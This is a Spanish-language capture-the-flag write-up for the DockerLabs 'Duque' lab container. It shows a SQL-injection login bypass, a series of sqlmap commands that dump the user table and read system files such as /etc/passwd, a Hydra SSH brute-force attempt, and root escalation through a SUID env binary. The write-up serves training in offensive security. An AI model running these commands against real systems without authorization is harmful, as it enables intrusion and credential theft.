---
title: "DockerLabs - Duque"
difficulty: "Fácil"
source: "DockerLabs"
---

Laboratorio para practicar hacking web mediante la explotación de dos vulnerabilidades: inyección SQL y lectura de ficheros con `sqlmap`, seguido de escalada de privilegios en Linux.

## Despliegue

```bash
bash auto_deploy.sh duque.tar
```

## Reconocimiento

Lanzamos un escaneo de red para visualizar los puertos abiertos:

```bash
nmap -sCV -p- 172.17.0.2
```

Comprobamos que los puertos 22 (SSH) y 80 (Apache) están abiertos.

Para enumerar directorios, lanzamos `gobuster`:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,zip,bak,txt,py,xml,log -t 40
```

Encontramos un directorio llamado `bills`, que muestra un formulario de inicio de sesión.

## Explotación

### Inyección SQL en el login

Realizamos una inyección SQL con las siguientes credenciales:

```
Usuario: admin' OR '1'='1
Contraseña: n
```

Entramos al panel de facturación de la aplicación, donde comprobamos que el usuario con el que nos hemos logueado es el administrador (`admin`).

### Explotación con sqlmap

Como ya sabemos que es vulnerable a inyección SQL, usamos `sqlmap` para buscar los parámetros explotables:

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" \
    --data="username=admin&password=n" \
    --cookie="PHPSESSID=f8aftlbipe6ejsdqfd26pc7d0f" \
    --batch
```

- `-u`: URL donde queremos que `sqlmap` busque parámetros vulnerables.
- `--data`: usuario y contraseña usados para iniciar sesión.
- `--cookie`: cookie de la sesión iniciada.
- `--batch`: evita la interacción manual con `sqlmap`.

El parámetro vulnerable es `username`. A partir de aquí vamos añadiendo capas al comando. Empezamos listando las bases de datos con `--dbs`:

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" \
    --data="username=admin&password=n" \
    --cookie="PHPSESSID=f8aftlbipe6ejsdqfd26pc7d0f" \
    --batch \
    --dbs
```

Aparecen las bases de datos típicas de MariaDB y una llamada `register`, que parece ser la que buscamos. Enumeramos sus tablas:

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" \
    --data="username=admin&password=n" \
    --cookie="PHPSESSID=f8aftlbipe6ejsdqfd26pc7d0f" \
    --batch \
    --tables -D register
```

Aparece una tabla llamada `users`. Listamos sus columnas para identificar usuarios con los que autenticarnos:

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" \
    --data="username=admin&password=n" \
    --cookie="PHPSESSID=f8aftlbipe6ejsdqfd26pc7d0f" \
    --batch \
    --columns -T users -D register
```

Muestra tres columnas (`id`, `passwd` y `username`). A continuación, volcamos la tabla completa:

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" \
    --data="username=admin&password=n" \
    --cookie="PHPSESSID=f8aftlbipe6ejsdqfd26pc7d0f" \
    --batch \
    --dump -T users -D register
```

Obtenemos usuarios y contraseñas en texto plano, por lo que no es necesario crackearlas:

| id | passwd    | username |
|----|-----------|----------|
| 1  | mario123  | mario    |
| 2  | jesus2026 | jesus    |
| 3  | admin123  | admin    |

### Lectura de ficheros del sistema

Probamos estas credenciales contra el Apache, pero solo `admin` da acceso al panel de facturación. Probamos otro vector: listar los usuarios de MySQL en la tabla `user`:

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" \
    --data="username=admin&password=n" \
    --cookie="PHPSESSID=f8aftlbipe6ejsdqfd26pc7d0f" \
    --batch \
    --dump -T user -D mysql
```

Hay varios usuarios de MySQL. El siguiente paso es comprobar qué privilegios tiene cada uno:

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" \
    --data="username=admin&password=admin" \
    -p username \
    --cookie="PHPSESSID=f8aftlbipe6ejsdqfd26pc7d0f" \
    --batch \
    --privileges
```

El usuario `mysql` tiene el privilegio `FILE`, que junto con un parámetro de `sqlmap` nos permite leer ficheros del sistema:

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" \
    --data="username=admin&password=n" \
    -p username \
    --cookie="PHPSESSID=f8aftlbipe6ejsdqfd26pc7d0f" \
    --batch \
    --file-read=/etc/passwd
```

Esto genera un fichero local que podemos visualizar para ver los usuarios del equipo remoto:

```bash
cat /home/sreaper/.local/share/sqlmap/output/172.17.0.2/files/_etc_passwd
```

Encontramos el usuario `duque`, con el que probamos un ataque de fuerza bruta por SSH:

```bash
hydra -l duque -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2:22 -t 4
```

Tras varios intentos sin éxito, descartamos crackear la contraseña e intentamos leer otros ficheros interesantes del servidor, como `panel.php` (lo único accesible como `admin`):

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" \
    --data="username=admin&password=n" \
    -p username \
    --cookie="PHPSESSID=f8aftlbipe6ejsdqfd26pc7d0f" \
    --batch \
    --file-read=/var/www/html/bills/panel.php

cat /home/sreaper/.local/share/sqlmap/output/172.17.0.2/files/_var_www_html_bills_panel.php
```

Dentro del archivo aparecen los IDs de la base de datos y se identifica el ID vulnerable, que usamos para buscar la factura correspondiente:

![Panel mostrando el ID de factura vulnerable](/assets/images/duque-panel-id.png)

Literalmente nos muestra la contraseña de `duque`:

![Contraseña de duque expuesta en la factura](/assets/images/duque-password.png)

Probamos el acceso por SSH:

```bash
ssh duque@172.17.0.2
```

## Escalada de privilegios

Acceso conseguido. Comprobamos si podemos escalar privilegios a root:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

Con `find` descubrimos varios binarios con el bit SUID:

```
/usr/bin/mount
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/env
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

El más llamativo es `env`. Lo explotamos:

```bash
env /bin/sh -p
```

## Conclusión

Éxito: acceso root conseguido. Laboratorio finalizado con éxito.
